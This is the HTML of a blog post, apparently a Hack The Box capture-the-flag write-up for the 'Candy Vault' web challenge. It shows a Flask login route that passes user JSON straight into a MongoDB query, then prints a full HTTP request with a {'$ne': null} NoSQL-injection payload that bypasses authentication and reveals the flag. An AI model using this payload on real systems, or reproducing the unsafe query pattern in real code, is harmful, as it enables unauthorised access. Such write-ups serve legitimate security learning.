@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Candy Vault - Flavien Jaquerod</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="HTB writeup for the very easy web challenge &#34;Candy Vault&#34;">
+		<meta property="og:url" content="//localhost:1313/posts/candy-vault/">
+  <meta property="og:site_name" content="Flavien Jaquerod">
+  <meta property="og:title" content="Candy Vault">
+  <meta property="og:description" content="HTB writeup for the very easy web challenge &#34;Candy Vault&#34;">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-31T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-01-31T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Challenge">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Veasy">
+    <meta property="article:tag" content="NoSQL">
+
+		
+  <meta itemprop="name" content="Candy Vault">
+  <meta itemprop="description" content="HTB writeup for the very easy web challenge &#34;Candy Vault&#34;">
+  <meta itemprop="datePublished" content="2025-01-31T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-01-31T00:00:00+00:00">
+  <meta itemprop="wordCount" content="289">
+  <meta itemprop="keywords" content="CTF,HTB,Challenge,Web,Veasy,NoSQL">
+		
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Candy Vault">
+  <meta name="twitter:description" content="HTB writeup for the very easy web challenge &#34;Candy Vault&#34;">
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/custom.css">
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="Cybersecurity stuff!" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/placeholder.png">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">Cybersecurity stuff!</div>
+					<div class="logo__tagline">ZeroDay Chronicles</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/about/">
+				
+				<span class="menu__text">About</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/posts/">
+				
+				<span class="menu__text">Posts</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Candy Vault</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 16 16"><path d="M8 1c2 0 3.5 2 3.5 4.5S10 9 10 9c3 1 4 2 4 6H2c0-4 1-5 4-6 0 0-1.5-1-1.5-3.5S6 1 8 1"/></svg><span class="meta__text">Flavien Jaquerod</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0a14 14 0 1 1 0 28 1 1 0 0 1 0-28m0 3a3 3 0 1 0 0 22 3 3 0 0 0 0-22m1 4h-2v8.4l6.8 4.4L22 18l-6-3.8z"/></svg><time class="meta__text" datetime="2025-01-31T00:00:00Z">2025-01-31</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2 1 2h8v11H0V2z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/writeup/" rel="category">Writeup</a>, <a class="meta__link" href="/categories/challenge/" rel="category">Challenge</a>, <a class="meta__link" href="/categories/web/" rel="category">Web</a>
+	</span>
+</div></div>
+		</header>
+		<div class="content post__content clearfix">
+			<pre tabindex="0"><code>The malevolent spirits have concealed all the Halloween treats within their secret vault, and it&#39;s imperative that you decipher its enigmatic seal to reclaim the candy before the spooky night arrives.
+</code></pre><p>==&gt; For this challenge we get a url as well as the source code, and going to the website we are met by a single login page. &ndash;&gt; checking the source code we see this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, Blueprint, render_template, redirect, jsonify, request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_bcrypt <span style="color:#f92672">import</span> Bcrypt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pymongo <span style="color:#f92672">import</span> MongoClient
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config<span style="color:#f92672">.</span>from_object(<span style="color:#e6db74">&#34;application.config.Config&#34;</span>)
+</span></span><span style="display:flex;"><span>bcrypt <span style="color:#f92672">=</span> Bcrypt(app)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>client <span style="color:#f92672">=</span> MongoClient(app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#34;MONGO_URI&#34;</span>])
+</span></span><span style="display:flex;"><span>db <span style="color:#f92672">=</span> client[app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#34;DB_NAME&#34;</span>]]
+</span></span><span style="display:flex;"><span>users_collection <span style="color:#f92672">=</span> db[<span style="color:#e6db74">&#34;users&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.errorhandler</span>(<span style="color:#a6e22e">Exception</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handle_error</span>(error):
+</span></span><span style="display:flex;"><span>    message <span style="color:#f92672">=</span> error<span style="color:#f92672">.</span>description <span style="color:#66d9ef">if</span> hasattr(error, <span style="color:#e6db74">&#34;description&#34;</span>) <span style="color:#66d9ef">else</span> [str(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> error<span style="color:#f92672">.</span>args]
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;error&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;type&#34;</span>: error<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__name__,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;message&#34;</span>: message
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response, error<span style="color:#f92672">.</span>code <span style="color:#66d9ef">if</span> hasattr(error, <span style="color:#e6db74">&#34;code&#34;</span>) <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/login&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
+</span></span><span style="display:flex;"><span>    content_type <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;Content-Type&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> content_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>:
+</span></span><span style="display:flex;"><span>        email <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;email&#34;</span>)
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;password&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> content_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;application/json&#34;</span>:
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get_json()
+</span></span><span style="display:flex;"><span>        email <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;email&#34;</span>)
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;password&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Unsupported Content-Type&#34;</span>}), <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> users_collection<span style="color:#f92672">.</span>find_one({<span style="color:#e6db74">&#34;email&#34;</span>: email, <span style="color:#e6db74">&#34;password&#34;</span>: password})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> user:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;candy.html&#34;</span>, flag<span style="color:#f92672">=</span>open(<span style="color:#e6db74">&#34;flag.txt&#34;</span>)<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span></code></pre></div><p>where we see that it is using a <code>MongoDB</code>database and checking if we are found before logging us in and displaying the flag &ndash;&gt;it is vulnerable to a <code>NoSQL</code>injection!! (See <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">this</a> for payloads)</p>
+<p>==&gt; We can capture the request in <code>BurpSuite</code>and send a request to get the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /login <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">94.237.50.242:42794</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">57</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://94.237.50.242:42794</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://94.237.50.242:42794/</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;email&#34;</span>:{<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#66d9ef">null</span>},
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;password&#34;</span>:{<span style="color:#f92672">&#34;$ne&#34;</span>:<span style="color:#66d9ef">null</span><span style="color:#960050;background-color:#1e0010">&#34;</span>}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>which logs us in and gets us the flag:</p>
+<p>==&gt; <strong><code>HTB{s4y_h1_t0_th3_c4andy_v4u1t!}</code></strong></p>
+
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M4 0h8s2 0 4 2l15 15s2 2 0 4L21 31s-2 2-4 0L2 16s-2-2-2-4V3s0-3 4-3m3 10a3 3 0 0 0 0-6 3 3 0 0 0 0 6"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/ctf/" rel="tag">CTF</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/htb/" rel="tag">HTB</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/challenge/" rel="tag">Challenge</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/web/" rel="tag">Web</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/veasy/" rel="tag">Veasy</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/nosql/" rel="tag">NoSQL</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Flavien Jaquerod avatar" src="/img/avatar.png" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Flavien Jaquerod</span>
+	</div>
+	<div class="authorbox__description">
+		Currently studying a cybersecurity Master&rsquo;s degree at EPFL and ETHZ. Also solving CTF challenges or HTB Machines in my free time!
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/jarmis/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Jarmis</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/bombslanded/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Bombs landed</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2025 Flavien Jaquerod.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+<script src="/js/custom.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+</body>
+</html>
